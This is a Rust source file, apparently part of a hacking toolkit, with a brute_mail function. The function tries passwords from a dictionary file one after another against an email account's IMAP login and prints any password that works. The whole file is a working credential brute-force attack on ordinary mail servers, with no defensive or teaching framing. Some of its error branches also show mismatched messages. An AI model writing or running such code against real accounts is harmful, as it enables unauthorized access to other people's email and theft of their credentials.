//std
use std::path::Path;
use std::process::exit;

// extern

// local
use crate::func::{restart, read_lines, color_terminal};
// mod


pub fn brute_mail(mail: String, dictionary: String, key: String, imap_address: String) {
    if mail != "" && dictionary != "" && imap_address != "" {
        if Path::new(dictionary.trim()).exists() {
            if let Ok(_lines) = read_lines(dictionary.trim()) {
                let mut list_word = vec![String::from("")];
                if let Ok(_lines) = read_lines(dictionary.trim()) {
                    let mut attempt = 0;
                    for line in _lines {
                        if let Ok(pass) = line {
                            if pass.contains(&key) && list_word[attempt] != pass {
                                let tls = native_tls::TlsConnector::builder().build().unwrap();
                                let client = imap::connect((imap_address.as_str(), 993), imap_address.as_str(), &tls).unwrap();
                                list_word.push(pass.clone());
                                attempt += 1;
                                match client.login(mail.clone(), pass.clone()) {
                                    Ok(_) => {
                                        println!("[!] [TRIED] => SUCCESS | [PASSWORD] => {}, [E-MAIL] => {}, ATTEMPT => {}", &pass, mail, attempt);
                                        color_terminal(&*format!("[!] [TRIED] => SUCCESS | [PASSWORD] => {}, [E-MAIL] => {}, ATTEMPT => {}", &pass, mail, attempt), "green");
                                        println!("\n");
                                        restart();
                                        break;
                                    }
                                    Err(_) => {
                                        color_terminal(&*format!("[!] [TRIED] => FALSE | [PASSWORD] => {}, [E-MAIL] => {}, ATTEMPT => {}", &pass, mail, attempt), "red");
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                color_terminal(&*format!("[!] [ERROR] The file ({}), You put does not exist :/", dictionary), "red");
                println!("\n");
                restart();
            }
        } else {
            color_terminal("[!] [ERROR] Please complete all fields ...", "red");
            println!("\n");
            restart();
        }
        exit(0);
    }
}
